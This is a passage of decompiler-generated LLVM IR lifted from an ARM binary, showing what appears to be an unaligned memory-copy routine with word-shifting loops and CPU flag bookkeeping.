  %v0_174a4 = phi i32 [ %v12_174a4, %dec_label_pc_17480.dec_label_pc_17480_crit_edge ], [ %v0_1757c76, %dec_label_pc_17478 ]
  %v0_17484 = phi i32 [ %v0_17484.pre, %dec_label_pc_17480.dec_label_pc_17480_crit_edge ], [ %v4_17460, %dec_label_pc_17478 ]
  %v0_17480 = phi i32 [ %v0_17480.pre, %dec_label_pc_17480.dec_label_pc_17480_crit_edge ], [ %v2_17460, %dec_label_pc_17478 ]
  %v3_17480 = udiv i32 %v0_17480, 256
  %v1_17484 = inttoptr i32 %v0_17484 to i32*
  %v2_17484 = load i32, i32* %v1_17484, align 4
  store i32 %v2_17484, i32* %r4.global-to-local, align 4
  %v3_17484 = add i32 %v0_17484, 4
  %v4_17484 = inttoptr i32 %v3_17484 to i32*
  %v5_17484 = load i32, i32* %v4_17484, align 4
  store i32 %v5_17484, i32* %r5.global-to-local, align 4
  %v6_17484 = add i32 %v0_17484, 8
  %v7_17484 = inttoptr i32 %v6_17484 to i32*
  %v8_17484 = load i32, i32* %v7_17484, align 4
  store i32 %v8_17484, i32* %ip.global-to-local, align 4
  %v9_17484 = add i32 %v0_17484, 12
  %v10_17484 = inttoptr i32 %v9_17484 to i32*
  %v11_17484 = load i32, i32* %v10_17484, align 4
  store i32 %v11_17484, i32* %lr.global-to-local, align 4
  %v12_17484 = add i32 %v0_17484, 16
  store i32 %v12_17484, i32* %r1.global-to-local, align 4
  %v4_17488 = mul i32 %v2_17484, 16777216
  %v5_17488 = or i32 %v4_17488, %v3_17480
  store i32 %v5_17488, i32* @r3, align 4
  %v3_1748c = udiv i32 %v2_17484, 256
  %v4_17490 = mul i32 %v5_17484, 16777216
  %v5_17490 = or i32 %v4_17490, %v3_1748c
  store i32 %v5_17490, i32* %r4.global-to-local, align 4
  %v3_17494 = udiv i32 %v5_17484, 256
  %v4_17498 = mul i32 %v8_17484, 16777216
  %v5_17498 = or i32 %v4_17498, %v3_17494
  store i32 %v5_17498, i32* %r5.global-to-local, align 4
  %v3_1749c = udiv i32 %v8_17484, 256
  %v4_174a0 = mul i32 %v11_17484, 16777216
  %v5_174a0 = or i32 %v4_174a0, %v3_1749c
  store i32 %v5_174a0, i32* @ip, align 4
  %v1_174a4 = inttoptr i32 %v0_174a4 to i32*
  store i32 %v5_17488, i32* %v1_174a4, align 4
  %v3_174a4 = add i32 %v0_174a4, 4
  %v4_174a4 = inttoptr i32 %v3_174a4 to i32*
  %v5_174a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_174a4, i32* %v4_174a4, align 4
  %v6_174a4 = add i32 %v0_174a4, 8
  %v7_174a4 = inttoptr i32 %v6_174a4 to i32*
  %v8_174a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_174a4, i32* %v7_174a4, align 4
  %v9_174a4 = add i32 %v0_174a4, 12
  %v10_174a4 = inttoptr i32 %v9_174a4 to i32*
  %v11_174a4 = load i32, i32* @ip, align 4
  store i32 %v11_174a4, i32* %v10_174a4, align 4
  %v12_174a4 = add i32 %v0_174a4, 16
  store i32 %v12_174a4, i32* @r0, align 4
  %v0_174a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174a8 = add i32 %v0_174a8, -16
  store i32 %v1_174a8, i32* %r2.global-to-local, align 4
  %v3_174a8 = sub i32 15, %v0_174a8
  %v4_174a8 = and i32 %v3_174a8, %v0_174a8
  %v5_174a8 = icmp slt i32 %v4_174a8, 0
  %v6_174a8 = icmp slt i32 %v1_174a8, 0
  %v2_174ac = xor i1 %v6_174a8, %v5_174a8
  br i1 %v2_174ac, label %dec_label_pc_174b0, label %dec_label_pc_17480.dec_label_pc_17480_crit_edge

dec_label_pc_17480.dec_label_pc_17480_crit_edge:  ; preds = %dec_label_pc_17480
  %v0_17480.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17484.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17480

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17480
  %v2_174b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_174b0, i32* @r4, align 4
  %v5_174b0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_174b0, i32* @r5, align 4
  %v1_174b4 = add i32 %v0_174a8, -4
  store i32 %v1_174b4, i32* %r2.global-to-local, align 4
  %v3_174b4 = add i32 %v0_174a8, 2147483632
  %v4_174b4 = and i32 %v1_174b4, %v3_174b4
  %v5_174b4 = icmp slt i32 %v4_174b4, 0
  store i1 %v5_174b4, i1* %cpsr_v.global-to-local, align 1
  %v6_174b4 = icmp slt i32 %v1_174b4, 0
  store i1 %v6_174b4, i1* %cpsr_n.global-to-local, align 1
  %v7_174b4 = icmp eq i32 %v1_174b4, 0
  store i1 %v7_174b4, i1* %cpsr_z.global-to-local, align 1
  %v2_174b8 = xor i1 %v6_174b4, %v5_174b4
  br i1 %v2_174b8, label %dec_label_pc_174d4, label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %dec_label_pc_174b0, %dec_label_pc_17470, %dec_label_pc_174bc
  %v1_174c8 = phi i32 [ %v4_174c8, %dec_label_pc_174bc ], [ %v12_174a4, %dec_label_pc_174b0 ], [ %v0_1757c76, %dec_label_pc_17470 ]
  %v0_174bc = load i32, i32* %lr.global-to-local, align 4
  %v3_174bc = udiv i32 %v0_174bc, 256
  store i32 %v3_174bc, i32* %ip.global-to-local, align 4
  %v0_174c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_174c0 = inttoptr i32 %v0_174c0 to i32*
  %v2_174c0 = load i32, i32* %v1_174c0, align 4
  store i32 %v2_174c0, i32* %lr.global-to-local, align 4
  %v4_174c0 = add i32 %v0_174c0, 4
  store i32 %v4_174c0, i32* %r1.global-to-local, align 4
  %v4_174c4 = mul i32 %v2_174c0, 16777216
  %v5_174c4 = or i32 %v4_174c4, %v3_174bc
  store i32 %v5_174c4, i32* @ip, align 4
  %v2_174c8 = inttoptr i32 %v1_174c8 to i32*
  store i32 %v5_174c4, i32* %v2_174c8, align 4
  %v3_174c8 = load i32, i32* @r0, align 4
  %v4_174c8 = add i32 %v3_174c8, 4
  store i32 %v4_174c8, i32* @r0, align 4
  %v0_174cc = load i32, i32* %r2.global-to-local, align 4
  %v1_174cc = add i32 %v0_174cc, -4
  store i32 %v1_174cc, i32* %r2.global-to-local, align 4
  %v3_174cc = sub i32 3, %v0_174cc
  %v4_174cc = and i32 %v3_174cc, %v0_174cc
  %v5_174cc = icmp slt i32 %v4_174cc, 0
  %v6_174cc = icmp slt i32 %v1_174cc, 0
  %v2_174d0 = xor i1 %v6_174cc, %v5_174cc
  br i1 %v2_174d0, label %dec_label_pc_174d4.loopexit, label %dec_label_pc_174bc

dec_label_pc_174d4.loopexit:                      ; preds = %dec_label_pc_174bc
  %v7_174cc = icmp eq i32 %v0_174cc, 4
  store i1 %v5_174cc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_174cc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_174cc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174d4.loopexit, %dec_label_pc_174b0
  %v0_173fc59 = phi i32 [ %v1_174cc, %dec_label_pc_174d4.loopexit ], [ %v1_174b4, %dec_label_pc_174b0 ]
  %v0_174d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_174d4 = add i32 %v0_174d4, -3
  store i32 %v1_174d4, i32* @r1, align 4
  br label %bb140

dec_label_pc_174dc:                               ; preds = %dec_label_pc_1745c
  br i1 %v2_174e0, label %dec_label_pc_17528, label %dec_label_pc_174e4

dec_label_pc_174e4:                               ; preds = %dec_label_pc_174dc
  store i32 %v1_174dc, i32* %r2.global-to-local, align 4
  %v3_174e8 = load i32, i32* @r4, align 4
  store i32 %v3_174e8, i32* %stack_var_-16, align 4
  %v6_174e8 = load i32, i32* @r5, align 4
  store i32 %v6_174e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_174ec

dec_label_pc_174ec:                               ; preds = %dec_label_pc_174ec.dec_label_pc_174ec_crit_edge, %dec_label_pc_174e4
  %v0_17510 = phi i32 [ %v12_17510, %dec_label_pc_174ec.dec_label_pc_174ec_crit_edge ], [ %v0_1757c76, %dec_label_pc_174e4 ]
  %v0_174f0 = phi i32 [ %v0_174f0.pre, %dec_label_pc_174ec.dec_label_pc_174ec_crit_edge ], [ %v4_17460, %dec_label_pc_174e4 ]
  %v0_174ec = phi i32 [ %v0_174ec.pre, %dec_label_pc_174ec.dec_label_pc_174ec_crit_edge ], [ %v2_17460, %dec_label_pc_174e4 ]
  %v3_174ec = udiv i32 %v0_174ec, 65536
  %v1_174f0 = inttoptr i32 %v0_174f0 to i32*
  %v2_174f0 = load i32, i32* %v1_174f0, align 4
  store i32 %v2_174f0, i32* %r4.global-to-local, align 4
  %v3_174f0 = add i32 %v0_174f0, 4
  %v4_174f0 = inttoptr i32 %v3_174f0 to i32*
  %v5_174f0 = load i32, i32* %v4_174f0, align 4
  store i32 %v5_174f0, i32* %r5.global-to-local, align 4
  %v6_174f0 = add i32 %v0_174f0, 8
  %v7_174f0 = inttoptr i32 %v6_174f0 to i32*
  %v8_174f0 = load i32, i32* %v7_174f0, align 4
  store i32 %v8_174f0, i32* %ip.global-to-local, align 4
  %v9_174f0 = add i32 %v0_174f0, 12
  %v10_174f0 = inttoptr i32 %v9_174f0 to i32*
  %v11_174f0 = load i32, i32* %v10_174f0, align 4
  store i32 %v11_174f0, i32* %lr.global-to-local, align 4
  %v12_174f0 = add i32 %v0_174f0, 16
  store i32 %v12_174f0, i32* %r1.global-to-local, align 4
  %v4_174f4 = mul i32 %v2_174f0, 65536
  %v5_174f4 = or i32 %v4_174f4, %v3_174ec
  store i32 %v5_174f4, i32* @r3, align 4
  %v3_174f8 = udiv i32 %v2_174f0, 65536
  %v4_174fc = mul i32 %v5_174f0, 65536
  %v5_174fc = or i32 %v4_174fc, %v3_174f8
  store i32 %v5_174fc, i32* %r4.global-to-local, align 4
  %v3_17500 = udiv i32 %v5_174f0, 65536
  %v4_17504 = mul i32 %v8_174f0, 65536
  %v5_17504 = or i32 %v4_17504, %v3_17500
  store i32 %v5_17504, i32* %r5.global-to-local, align 4
  %v3_17508 = udiv i32 %v8_174f0, 65536
  %v4_1750c = mul i32 %v11_174f0, 65536
  %v5_1750c = or i32 %v4_1750c, %v3_17508
  store i32 %v5_1750c, i32* @ip, align 4
  %v1_17510 = inttoptr i32 %v0_17510 to i32*
  store i32 %v5_174f4, i32* %v1_17510, align 4
  %v3_17510 = add i32 %v0_17510, 4
  %v4_17510 = inttoptr i32 %v3_17510 to i32*
  %v5_17510 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17510, i32* %v4_17510, align 4
  %v6_17510 = add i32 %v0_17510, 8
  %v7_17510 = inttoptr i32 %v6_17510 to i32*
  %v8_17510 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17510, i32* %v7_17510, align 4
  %v9_17510 = add i32 %v0_17510, 12
  %v10_17510 = inttoptr i32 %v9_17510 to i32*
  %v11_17510 = load i32, i32* @ip, align 4
  store i32 %v11_17510, i32* %v10_17510, align 4
  %v12_17510 = add i32 %v0_17510, 16
  store i32 %v12_17510, i32* @r0, align 4
  %v0_17514 = load i32, i32* %r2.global-to-local, align 4
  %v1_17514 = add i32 %v0_17514, -16
  store i32 %v1_17514, i32* %r2.global-to-local, align 4
  %v3_17514 = sub i32 15, %v0_17514
  %v4_17514 = and i32 %v3_17514, %v0_17514
  %v5_17514 = icmp slt i32 %v4_17514, 0
  %v6_17514 = icmp slt i32 %v1_17514, 0
  %v2_17518 = xor i1 %v6_17514, %v5_17514
  br i1 %v2_17518, label %dec_label_pc_1751c, label %dec_label_pc_174ec.dec_label_pc_174ec_crit_edge

dec_label_pc_174ec.dec_label_pc_174ec_crit_edge:  ; preds = %dec_label_pc_174ec
  %v0_174ec.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_174f0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_174ec

dec_label_pc_1751c:                               ; preds = %dec_label_pc_174ec
  %v2_1751c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1751c, i32* @r4, align 4
  %v5_1751c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1751c, i32* @r5, align 4
  %v1_17520 = add i32 %v0_17514, -4
  store i32 %v1_17520, i32* %r2.global-to-local, align 4
  %v3_17520 = add i32 %v0_17514, 2147483632
  %v4_17520 = and i32 %v1_17520, %v3_17520
  %v5_17520 = icmp slt i32 %v4_17520, 0
  store i1 %v5_17520, i1* %cpsr_v.global-to-local, align 1
  %v6_17520 = icmp slt i32 %v1_17520, 0
  store i1 %v6_17520, i1* %cpsr_n.global-to-local, align 1
  %v7_17520 = icmp eq i32 %v1_17520, 0
  store i1 %v7_17520, i1* %cpsr_z.global-to-local, align 1
  %v2_17524 = xor i1 %v6_17520, %v5_17520
  br i1 %v2_17524, label %dec_label_pc_17540, label %dec_label_pc_17528

dec_label_pc_17528:                               ; preds = %dec_label_pc_1751c, %dec_label_pc_174dc, %dec_label_pc_17528
  %v1_17534 = phi i32 [ %v4_17534, %dec_label_pc_17528 ], [ %v12_17510, %dec_label_pc_1751c ], [ %v0_1757c76, %dec_label_pc_174dc ]
  %v0_17528 = load i32, i32* %lr.global-to-local, align 4
  %v3_17528 = udiv i32 %v0_17528, 65536
  store i32 %v3_17528, i32* %ip.global-to-local, align 4
  %v0_1752c = load i32, i32* %r1.global-to-local, align 4
  %v1_1752c = inttoptr i32 %v0_1752c to i32*
  %v2_1752c = load i32, i32* %v1_1752c, align 4
  store i32 %v2_1752c, i32* %lr.global-to-local, align 4
  %v4_1752c = add i32 %v0_1752c, 4
  store i32 %v4_1752c, i32* %r1.global-to-local, align 4
  %v4_17530 = mul i32 %v2_1752c, 65536
  %v5_17530 = or i32 %v4_17530, %v3_17528
  store i32 %v5_17530, i32* @ip, align 4
  %v2_17534 = inttoptr i32 %v1_17534 to i32*
  store i32 %v5_17530, i32* %v2_17534, align 4
  %v3_17534 = load i32, i32* @r0, align 4
  %v4_17534 = add i32 %v3_17534, 4
  store i32 %v4_17534, i32* @r0, align 4
  %v0_17538 = load i32, i32* %r2.global-to-local, align 4
  %v1_17538 = add i32 %v0_17538, -4
  store i32 %v1_17538, i32* %r2.global-to-local, align 4
  %v3_17538 = sub i32 3, %v0_17538
  %v4_17538 = and i32 %v3_17538, %v0_17538
  %v5_17538 = icmp slt i32 %v4_17538, 0
  %v6_17538 = icmp slt i32 %v1_17538, 0
  %v2_1753c = xor i1 %v6_17538, %v5_17538
  br i1 %v2_1753c, label %dec_label_pc_17540.loopexit, label %dec_label_pc_17528

dec_label_pc_17540.loopexit:                      ; preds = %dec_label_pc_17528
  %v7_17538 = icmp eq i32 %v0_17538, 4
  store i1 %v5_17538, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17538, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17538, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17540

dec_label_pc_17540:                               ; preds = %dec_label_pc_17540.loopexit, %dec_label_pc_1751c
  %v0_173fc60 = phi i32 [ %v1_17538, %dec_label_pc_17540.loopexit ], [ %v1_17520, %dec_label_pc_1751c ]
  %v0_17540 = load i32, i32* %r1.global-to-local, align 4
  %v1_17540 = add i32 %v0_17540, -2
  store i32 %v1_17540, i32* @r1, align 4
  br label %bb140

dec_label_pc_17548:                               ; preds = %dec_label_pc_1745c
  br i1 %v2_174e0, label %dec_label_pc_17594, label %dec_label_pc_17550

dec_label_pc_17550:                               ; preds = %dec_label_pc_17548
  store i32 %v1_174dc, i32* %r2.global-to-local, align 4
  %v3_17554 = load i32, i32* @r4, align 4
  store i32 %v3_17554, i32* %stack_var_-16, align 4
  %v6_17554 = load i32, i32* @r5, align 4
  store i32 %v6_17554, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17558

dec_label_pc_17558:                               ; preds = %dec_label_pc_17558.dec_label_pc_17558_crit_edge, %dec_label_pc_17550
  %v0_1757c = phi i32 [ %v12_1757c, %dec_label_pc_17558.dec_label_pc_17558_crit_edge ], [ %v0_1757c76, %dec_label_pc_17550 ]
  %v0_1755c = phi i32 [ %v0_1755c.pre, %dec_label_pc_17558.dec_label_pc_17558_crit_edge ], [ %v4_17460, %dec_label_pc_17550 ]
  %v0_17558 = phi i32 [ %v0_17558.pre, %dec_label_pc_17558.dec_label_pc_17558_crit_edge ], [ %v2_17460, %dec_label_pc_17550 ]
  %v3_17558 = udiv i32 %v0_17558, 16777216
  %v1_1755c = inttoptr i32 %v0_1755c to i32*
  %v2_1755c = load i32, i32* %v1_1755c, align 4
  store i32 %v2_1755c, i32* %r4.global-to-local, align 4
  %v3_1755c = add i32 %v0_1755c, 4
  %v4_1755c = inttoptr i32 %v3_1755c to i32*
  %v5_1755c = load i32, i32* %v4_1755c, align 4
  store i32 %v5_1755c, i32* %r5.global-to-local, align 4
  %v6_1755c = add i32 %v0_1755c, 8
  %v7_1755c = inttoptr i32 %v6_1755c to i32*
  %v8_1755c = load i32, i32* %v7_1755c, align 4
  store i32 %v8_1755c, i32* %ip.global-to-local, align 4
  %v9_1755c = add i32 %v0_1755c, 12
  %v10_1755c = inttoptr i32 %v9_1755c to i32*
  %v11_1755c = load i32, i32* %v10_1755c, align 4
  store i32 %v11_1755c, i32* %lr.global-to-local, align 4
  %v12_1755c = add i32 %v0_1755c, 16
  store i32 %v12_1755c, i32* %r1.global-to-local, align 4
  %v4_17560 = mul i32 %v2_1755c, 256
  %v5_17560 = or i32 %v4_17560, %v3_17558
  store i32 %v5_17560, i32* @r3, align 4
  %v3_17564 = udiv i32 %v2_1755c, 16777216
  %v4_17568 = mul i32 %v5_1755c, 256
  %v5_17568 = or i32 %v4_17568, %v3_17564
  store i32 %v5_17568, i32* %r4.global-to-local, align 4
  %v3_1756c = udiv i32 %v5_1755c, 16777216
  %v4_17570 = mul i32 %v8_1755c, 256
  %v5_17570 = or i32 %v4_17570, %v3_1756c
  store i32 %v5_17570, i32* %r5.global-to-local, align 4
  %v3_17574 = udiv i32 %v8_1755c, 16777216
  %v4_17578 = mul i32 %v11_1755c, 256
  %v5_17578 = or i32 %v4_17578, %v3_17574
  store i32 %v5_17578, i32* @ip, align 4
  %v1_1757c = inttoptr i32 %v0_1757c to i32*
  store i32 %v5_17560, i32* %v1_1757c, align 4
  %v3_1757c = add i32 %v0_1757c, 4
  %v4_1757c = inttoptr i32 %v3_1757c to i32*
  %v5_1757c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1757c, i32* %v4_1757c, align 4
  %v6_1757c = add i32 %v0_1757c, 8
  %v7_1757c = inttoptr i32 %v6_1757c to i32*
  %v8_1757c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1757c, i32* %v7_1757c, align 4
  %v9_1757c = add i32 %v0_1757c, 12
  %v10_1757c = inttoptr i32 %v9_1757c to i32*
  %v11_1757c = load i32, i32* @ip, align 4
  store i32 %v11_1757c, i32* %v10_1757c, align 4
  %v12_1757c = add i32 %v0_1757c, 16
  store i32 %v12_1757c, i32* @r0, align 4
  %v0_17580 = load i32, i32* %r2.global-to-local, align 4
  %v1_17580 = add i32 %v0_17580, -16
  store i32 %v1_17580, i32* %r2.global-to-local, align 4
  %v3_17580 = sub i32 15, %v0_17580
  %v4_17580 = and i32 %v3_17580, %v0_17580
  %v5_17580 = icmp slt i32 %v4_17580, 0
  %v6_17580 = icmp slt i32 %v1_17580, 0
  %v2_17584 = xor i1 %v6_17580, %v5_17580
  br i1 %v2_17584, label %dec_label_pc_17588, label %dec_label_pc_17558.dec_label_pc_17558_crit_edge

dec_label_pc_17558.dec_label_pc_17558_crit_edge:  ; preds = %dec_label_pc_17558
  %v0_17558.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1755c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17558

dec_label_pc_17588:                               ; preds = %dec_label_pc_17558
  %v2_17588 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17588, i32* @r4, align 4
  %v5_17588 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_17588, i32* @r5, align 4
  %v1_1758c = add i32 %v0_17580, -4
  store i32 %v1_1758c, i32* %r2.global-to-local, align 4
  %v3_1758c = add i32 %v0_17580, 2147483632
  %v4_1758c = and i32 %v1_1758c, %v3_1758c
  %v5_1758c = icmp slt i32 %v4_1758c, 0
  store i1 %v5_1758c, i1* %cpsr_v.global-to-local, align 1
  %v6_1758c = icmp slt i32 %v1_1758c, 0
  store i1 %v6_1758c, i1* %cpsr_n.global-to-local, align 1
  %v7_1758c = icmp eq i32 %v1_1758c, 0
  store i1 %v7_1758c, i1* %cpsr_z.global-to-local, align 1
  %v2_17590 = xor i1 %v6_1758c, %v5_1758c
  br i1 %v2_17590, label %dec_label_pc_175ac, label %dec_label_pc_17594

dec_label_pc_17594:                               ; preds = %dec_label_pc_17588, %dec_label_pc_17548, %dec_label_pc_17594
  %v1_175a0 = phi i32 [ %v4_175a0, %dec_label_pc_17594 ], [ %v12_1757c, %dec_label_pc_17588 ], [ %v0_1757c76, %dec_label_pc_17548 ]
  %v0_17594 = load i32, i32* %lr.global-to-local, align 4
  %v3_17594 = udiv i32 %v0_17594, 16777216
  store i32 %v3_17594, i32* %ip.global-to-local, align 4
  %v0_17598 = load i32, i32* %r1.global-to-local, align 4
  %v1_17598 = inttoptr i32 %v0_17598 to i32*
  %v2_17598 = load i32, i32* %v1_17598, align 4
  store i32 %v2_17598, i32* %lr.global-to-local, align 4
  %v4_17598 = add i32 %v0_17598, 4
  store i32 %v4_17598, i32* %r1.global-to-local, align 4
  %v4_1759c = mul i32 %v2_17598, 256
  %v5_1759c = or i32 %v4_1759c, %v3_17594
  store i32 %v5_1759c, i32* @ip, align 4
  %v2_175a0 = inttoptr i32 %v1_175a0 to i32*
  store i32 %v5_1759c, i32* %v2_175a0, align 4
  %v3_175a0 = load i32, i32* @r0, align 4
  %v4_175a0 = add i32 %v3_175a0, 4
  store i32 %v4_175a0, i32* @r0, align 4
  %v0_175a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_175a4 = add i32 %v0_175a4, -4
  store i32 %v1_175a4, i32* %r2.global-to-local, align 4
  %v3_175a4 = sub i32 3, %v0_175a4
  %v4_175a4 = and i32 %v3_175a4, %v0_175a4
  %v5_175a4 = icmp slt i32 %v4_175a4, 0
  %v6_175a4 = icmp slt i32 %v1_175a4, 0
  %v2_175a8 = xor i1 %v6_175a4, %v5_175a4
  br i1 %v2_175a8, label %dec_label_pc_175ac.loopexit, label %dec_label_pc_17594

dec_label_pc_175ac.loopexit:                      ; preds = %dec_label_pc_17594
  %v7_175a4 = icmp eq i32 %v0_175a4, 4
  store i1 %v5_175a4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_175a4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_175a4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_175ac

dec_label_pc_175ac:                               ; preds = %dec_label_pc_175ac.loopexit, %dec_label_pc_17588
  %v0_173fc61 = phi i32 [ %v1_175a4, %dec_label_pc_175ac.loopexit ], [ %v1_1758c, %dec_label_pc_17588 ]
  %v0_175ac = load i32, i32* %r1.global-to-local, align 4
  %v1_175ac = add i32 %v0_175ac, -1
  store i32 %v1_175ac, i32* @r1, align 4
  br label %bb140

dec_label_pc_175b4:                               ; preds = %entry
  %v1_175b4 = load i32, i32* @r2, align 4
  %v2_175b4 = add i32 %v1_175b4, %v0_17360
  store i32 %v2_175b4, i32* %r1.global-to-local, align 4
  %v2_175b8 = add i32 %v1_175b4, %v1_17360
  store i32 %v2_175b8, i32* %r0.global-to-local, align 4
  %v2_175bc = add i32 %v1_175b4, -4
  store i32 %v2_175bc, i32* %r2.global-to-local, align 4
  %v4_175bc = sub i32 3, %v1_175b4
  %v5_175bc = and i32 %v4_175bc, %v1_175b4
  %v6_175bc = icmp slt i32 %v5_175bc, 0
  store i1 %v6_175bc, i1* %cpsr_v.global-to-local, align 1
  %v7_175bc = icmp slt i32 %v2_175bc, 0
  store i1 %v7_175bc, i1* %cpsr_n.global-to-local, align 1
  %v8_175bc = icmp eq i32 %v1_175b4, 4
  store i1 %v8_175bc, i1* %cpsr_z.global-to-local, align 1
  %v5_175c0 = icmp slt i32 %v1_175b4, 4
  br i1 %v5_175c0, label %bb150, label %dec_label_pc_175c4

dec_label_pc_175c4:                               ; preds = %dec_label_pc_175b4
  %v1_175c4 = urem i32 %v2_175b8, 4
  store i32 %v1_175c4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_175c4 = icmp eq i32 %v1_175c4, 0
  store i1 %v2_175c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175c4, label %dec_label_pc_175cc, label %dec_label_pc_1766c

dec_label_pc_175cc:                               ; preds = %dec_label_pc_175c4
  %v1_175cc = urem i32 %v2_175b4, 4
  store i32 %v1_175cc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_175cc = icmp eq i32 %v1_175cc, 0
  store i1 %v2_175cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175cc, label %dec_label_pc_175d4, label %dec_label_pc_17698

dec_label_pc_175d4:                               ; preds = %dec_label_pc_175cc, %dec_label_pc_17690
  %v0_175ec37 = phi i32 [ %v2_175b8, %dec_label_pc_175cc ], [ %v0_176e020, %dec_label_pc_17690 ]
  %v0_175e836 = phi i32 [ %v2_175b4, %dec_label_pc_175cc ], [ %v0_17690, %dec_label_pc_17690 ]
  %v0_175d4 = phi i32 [ %v2_175bc, %dec_label_pc_175cc ], [ %v2_17688, %dec_label_pc_17690 ]
  %v2_175d4 = add i32 %v0_175d4, -8
  store i32 %v2_175d4, i32* %r2.global-to-local, align 4
  %v4_175d4 = sub i32 7, %v0_175d4
  %v5_175d4 = and i32 %v4_175d4, %v0_175d4
  %v6_175d4 = icmp slt i32 %v5_175d4, 0
  store i1 %v6_175d4, i1* %cpsr_v.global-to-local, align 1
  %v7_175d4 = icmp slt i32 %v2_175d4, 0
  store i1 %v7_175d4, i1* %cpsr_n.global-to-local, align 1
  %v8_175d4 = icmp eq i32 %v0_175d4, 8
  store i1 %v8_175d4, i1* %cpsr_z.global-to-local, align 1
  %v5_175d8 = icmp slt i32 %v0_175d4, 8
  br i1 %v5_175d8, label %dec_label_pc_17624, label %dec_label_pc_175dc

dec_label_pc_175dc:                               ; preds = %dec_label_pc_175d4
  %v3_175dc = load i32, i32* @r4, align 4
  %v5_175dc = inttoptr i32 %v3_175dc to i8*
  store i8* %v5_175dc, i8** %stack_var_-8, align 4
  %v8_175dc = load i32, i32* @lr, align 4
  %v2_175e0 = add i32 %v0_175d4, -28
  store i32 %v2_175e0, i32* %r2.global-to-local, align 4
  %v4_175e0 = sub i32 27, %v0_175d4
  %v5_175e0 = and i32 %v4_175e0, %v2_175d4
  %v6_175e0 = icmp slt i32 %v5_175e0, 0
  store i1 %v6_175e0, i1* %cpsr_v.global-to-local, align 1
  %v7_175e0 = icmp slt i32 %v2_175e0, 0
  store i1 %v7_175e0, i1* %cpsr_n.global-to-local, align 1
  %v8_175e0 = icmp eq i32 %v2_175d4, 20
  store i1 %v8_175e0, i1* %cpsr_z.global-to-local, align 1
  %v5_175e4 = icmp slt i32 %v2_175d4, 20
  br i1 %v5_175e4, label %dec_label_pc_17600, label %dec_label_pc_175e8

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175dc, %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge
  %v0_175ec = phi i32 [ %v1_175f4, %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge ], [ %v0_175ec37, %dec_label_pc_175dc ]
  %v0_175e8 = phi i32 [ %v0_175e8.pre, %dec_label_pc_175e8.dec_label_pc_175e8_crit_edge ], [ %v0_175e836, %dec_label_pc_175dc ]
  %v1_175e8 = add i32 %v0_175e8, -4
  %v2_175e8 = inttoptr i32 %v1_175e8 to i32*
  %v3_175e8 = load i32, i32* %v2_175e8, align 4
  %v4_175e8 = add i32 %v0_175e8, -8
  %v5_175e8 = inttoptr i32 %v4_175e8 to i32*
  %v6_175e8 = load i32, i32* %v5_175e8, align 4
  store i32 %v6_175e8, i32* %r4.global-to-local, align 4
  %v7_175e8 = add i32 %v0_175e8, -12
  %v8_175e8 = inttoptr i32 %v7_175e8 to i32*
  %v9_175e8 = load i32, i32* %v8_175e8, align 4
  store i32 %v9_175e8, i32* %ip.global-to-local, align 4
  %v10_175e8 = add i32 %v0_175e8, -16
  %v11_175e8 = inttoptr i32 %v10_175e8 to i32*
  %v12_175e8 = load i32, i32* %v11_175e8, align 4
  store i32 %v12_175e8, i32* %lr.global-to-local, align 4
  store i32 %v10_175e8, i32* %r1.global-to-local, align 4
  %v1_175ec = add i32 %v0_175ec, -16
  %v2_175ec = inttoptr i32 %v1_175ec to i32*
  store i32 %v3_175e8, i32* %v2_175ec, align 4
  %v4_175ec = add i32 %v0_175ec, -12
  %v5_175ec = inttoptr i32 %v4_175ec to i32*
  %v6_175ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_175ec, i32* %v5_175ec, align 4
  %v7_175ec = add i32 %v0_175ec, -8
  %v8_175ec = inttoptr i32 %v7_175ec to i32*
  %v9_175ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_175ec, i32* %v8_175ec, align 4
  %v10_175ec = add i32 %v0_175ec, -4
  %v11_175ec = inttoptr i32 %v10_175ec to i32*
  %v12_175ec = load i32, i32* %lr.global-to-local, align 4
